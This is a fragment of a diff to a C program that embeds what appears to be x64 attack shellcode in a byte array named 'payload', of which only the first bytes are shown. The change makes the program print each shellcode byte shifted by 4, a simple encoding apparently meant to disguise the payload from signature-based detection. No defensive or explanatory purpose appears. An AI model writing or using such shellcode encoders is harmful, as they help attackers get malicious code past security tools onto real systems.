@@ -1,4 +1,7 @@
+
 #include <stdio.h>
+
+
 
 int main() {
     unsigned char payload[] = {0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
@@ -24,7 +27,7 @@ int main() {
     };
 
     for (int i = 0; i < sizeof(payload); i++) {
-        printf("%02X ", payload[i]); // Using %02X to print in hexadecimal format with leading zeros
+        printf("%02X ", payload[i]+1+3); // Using %02X to print in hexadecimal format with leading zeros
     }
     printf("\n");
 
